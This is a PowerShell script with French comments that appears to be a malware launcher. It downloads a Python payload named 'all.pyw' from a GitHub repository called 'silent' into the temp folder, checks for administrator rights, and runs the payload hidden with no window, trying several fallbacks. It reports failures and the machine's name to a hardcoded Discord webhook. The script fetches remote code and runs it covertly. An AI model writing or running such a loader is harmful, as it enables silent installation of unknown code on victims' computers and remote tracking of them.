$ErrorActionPreference = 'Stop'
$WEBHOOK = 'https://discord.com/api/webhooks/1553812001174851644/XxjDh7jerGG_jVNKlmSF48UEycZFiD7PDwMGMSKiuQ7d9RWeYt-JvGOS3Y-5xPGX3D-E'

function Report-Error($msg) {
    try {
        $body = @{ content = "**ERREUR LAUNCHER — $env:COMPUTERNAME**`n``````$msg``````" } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10 > $null
    } catch {}
}

try {
    $tmp = Join-Path $env:TEMP 'all.pyw'

    # Étape 1 : téléchargement
    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $tmp -UseBasicParsing
    } catch {
        Report-Error "Erreur téléchargement all.pyw : $($_.Exception.Message)"
        exit 1
    }

    if (-not (Test-Path $tmp)) {
        Report-Error "all.pyw non téléchargé"
        exit 1
    }

    # Étape 2 : détection admin
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $isAdmin = $false
    }

    # Étape 3 : lancement pythonw (sans UAC, fenêtre cachée)
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = 'pythonw.exe'
        $psi.Arguments = '"' + $tmp + '"'
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } catch {
        # Fallback 1 : Start-Process direct
        try {
            Start-Process -FilePath 'pythonw.exe' -ArgumentList @($tmp) -WindowStyle Hidden
        } catch {
            # Fallback 2 : Start-Process sur le .pyw
            try {
                Start-Process -FilePath $tmp -WindowStyle Hidden
            } catch {
                Report-Error "Impossible de lancer all.pyw : $($_.Exception.Message)"
                exit 1
            }
        }
    }
} catch {
    Report-Error "Erreur globale : $($_.Exception.Message) | Ligne: $($_.InvocationInfo.ScriptLineNumber)"
    exit 1
}

exit 0
